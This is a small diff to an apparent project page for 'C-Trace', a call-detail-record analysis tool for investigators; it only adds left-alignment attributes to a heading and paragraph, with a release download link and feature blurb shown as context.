@@ -12,8 +12,8 @@
     <h4><a href="https://github.com/ramreddy/c-trace-download/raw/main/releases/download/1.1.7/ctrace.1.1.7.zip">Download Last Version</a></h4>
   </p>
 
-  <h5>The advanced CDR analysis software for solving crimes</h5>
-  <p>
+  <h5 align="left">The advanced CDR analysis software for solving crimes</h5>
+  <p align="left">
   C-Trace Single number analysis features provide a wide range of tools for analyzing a specific phone number and its call data. The software can generate summaries and visual representations of the data to help investigators quickly understand the patterns of a specific phone number and identify any suspicious activity. Additionally, the software can provide information on the past relationships, routes, and call locations of a specific phone number, which can help investigators track down suspects and build a case.
   </p>
 </div>
